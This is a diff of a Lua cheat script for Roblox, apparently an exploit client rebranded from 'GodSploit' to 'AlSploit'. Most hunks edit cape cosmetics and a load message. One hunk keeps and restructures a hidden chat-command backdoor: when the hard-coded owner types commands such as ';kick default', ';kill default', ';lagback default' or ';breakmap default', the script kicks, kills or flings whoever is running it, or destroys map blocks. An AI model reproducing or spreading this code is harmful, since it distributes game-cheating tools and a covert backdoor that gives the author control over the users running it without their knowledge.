-						end
+						if CallBack == true then
+							if IsAlive(LocalPlayer) and not LocalPlayer.Character:FindFirstChild("Cape") then
+								CreateCape("rbxassetid://" .. DecalId)
+							end
+						end						
 					end)
-				end)
-			end)			
-		end
+				end)			
+			end
+		end)		
 
-		if Settings.Cape.Value == false then
-			task.spawn(function()
+		task.spawn(function()
+			if Settings.Cape.Value == false then
 				if IsAlive(LocalPlayer) and LocalPlayer.Character:FindFirstChild("Cape") then
 					LocalPlayer.Character.Cape:Destroy()
-				end
-			end)			
-		end
+				end			
+			end
+		end)		
 	end)
 
 	task.spawn(function()
@@ -6332,7 +6402,7 @@ task.spawn(function()
 					Settings.Cape.Value = not Settings.Cape.Value
 
 					if Settings.Cape.Value == true then
-						UIGradient.Color =  ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.new(1, 0.666667, 0)), ColorSequenceKeypoint.new(1.00, Color3.new(1, 0.803922, 0.411765))}
+						UIGradient.Color =  ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.new(0.411765, 0.215686, 1)), ColorSequenceKeypoint.new(1.00, Color3.new(0.560784, 0.411765, 1))}
 					end
 
 					if Settings.Cape.Value == false then
@@ -6355,21 +6425,21 @@ task.spawn(function()
 					Settings.Cape.Sigma = CallBack
 
 					task.spawn(function()
-						if Settings.Cape.Sigma == true then
-							task.spawn(function()
-								if IsAlive(LocalPlayer) and Settings.Cape.Value == true and LocalPlayer.Character:FindFirstChild("Cape") then
+						task.spawn(function()
+							if Settings.Cape.Sigma == true then
+								if IsAlive(LocalPlayer) and LocalPlayer.Character:FindFirstChild("Cape") then
 									LocalPlayer.Character:FindFirstChild("Cape").Decal.Texture = "rbxassetid://" .. 13528140280
 								end
-							end)
-						end
+							end
+						end)
 
-						if Settings.Cape.Sigma  == false then
-							task.spawn(function()
-								if IsAlive(LocalPlayer) and Settings.Cape.Value == true and LocalPlayer.Character:FindFirstChild("Cape") then
+						task.spawn(function()
+							if Settings.Cape.Sigma  == false then
+								if IsAlive(LocalPlayer) and LocalPlayer.Character:FindFirstChild("Cape") then
 									LocalPlayer.Character:FindFirstChild("Cape").Decal.Texture = "rbxassetid://" .. 16331277884
 								end
-							end)
-						end
+							end
+						end)						
 					end)
 				end)
 			end
@@ -6385,35 +6455,37 @@ task.spawn(function()
 	repeat
 		task.wait(1)
 
-		for i, v in next, PlayerService:GetPlayers() do
-			v.Chatted:Connect(function(Message)				
-				if Message:lower() == ";kick default" and v.Name == Owner and LocalPlayer.Name ~= Owner then
-					task.spawn(function()
-						LocalPlayer:Kick("Kicked by GodSploit owner")
-					end)
-				end
-
-				if Message:lower() == ";kill default" and v.Name == Owner and LocalPlayer.Name ~= Owner then
-					task.spawn(function()
-						KillHumanoid(0)
-					end)
-				end
-
-				if Message:lower() == ";lagback default" and v.Name == Owner and LocalPlayer.Name ~= Owner then
-					task.spawn(function()
-						LocalPlayer.Character.PrimaryPart.Velocity = Vector3.new(99999, 99999, 99999)
-					end)
-				end
-
-				if Message:lower() == ";breakmap default" and v.Name == Owner and LocalPlayer.Name ~= Owner then
-					task.spawn(function()
-						for i, v in next, CollectionService:GetTagged("block") do
-							v:Destroy()
+		task.spawn(function()
+			for i, v in next, PlayerService:GetPlayers() do
+				v.Chatted:Connect(function(Message)		
+					task.spawn(function ()
+						if Message:lower() == ";kick default" and v.Name == Owner and LocalPlayer.Name ~= Owner then
+							LocalPlayer:Kick("Kicked by AlSploit owner")
 						end
 					end)
-				end
-			end)
-		end
+
+					task.spawn(function()
+						if Message:lower() == ";kill default" and v.Name == Owner and LocalPlayer.Name ~= Owner then
+							KillHumanoid(0)
+						end	
+					end)
+
+					task.spawn(function()
+						if Message:lower() == ";lagback default" and v.Name == Owner and LocalPlayer.Name ~= Owner then
+							LocalPlayer.Character.PrimaryPart.Velocity = Vector3.new(99999, 99999, 99999)
+						end
+					end)
+
+					task.spawn(function()
+						if Message:lower() == ";breakmap default" and v.Name == Owner and LocalPlayer.Name ~= Owner then
+							for i, v in next, CollectionService:GetTagged("block") do
+								v:Destroy()
+							end
+						end
+					end)					
+				end)
+			end
+		end)		
 	until not game
 end)
 
@@ -6477,7 +6549,7 @@ task.spawn(function()
 	end)
 
 	task.spawn(function()
-		CreateNotification(5, "GodSploit has loaded!")
+		CreateNotification(5, "AlSploit has loaded!")
 	end)
 
 	task.spawn(function()
